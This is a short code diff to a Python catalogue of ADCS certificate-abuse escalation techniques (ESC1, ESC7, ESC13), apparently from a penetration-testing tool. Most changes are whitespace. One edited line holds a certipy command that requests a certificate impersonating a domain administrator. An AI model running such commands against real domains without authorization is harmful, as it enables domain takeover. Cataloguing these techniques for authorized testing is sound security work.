@@ -15,7 +15,6 @@ class EscTechnique:
     requires_external_listener: bool = False
 
 
-
 ESC_TECHNIQUES: dict[str, EscTechnique] = {
     "esc1": EscTechnique(
         key="esc1",
@@ -68,8 +67,7 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         mitre_id="T1649",
         summary="CA allows requester to specify SAN in any template issued by this CA.",
         manual_commands=(
-            "certipy req -u user -p pass -ca <CA> -template User "
-            "-upn administrator@<DOMAIN>",
+            "certipy req -u user -p pass -ca <CA> -template User -upn administrator@<DOMAIN>",
         ),
     ),
     "esc7": EscTechnique(
@@ -149,7 +147,6 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         ),
         requires_external_listener=True,
     ),
-
     "esc13": EscTechnique(
         key="esc13",
         title="ESC13 — Issuance policy OID group link",
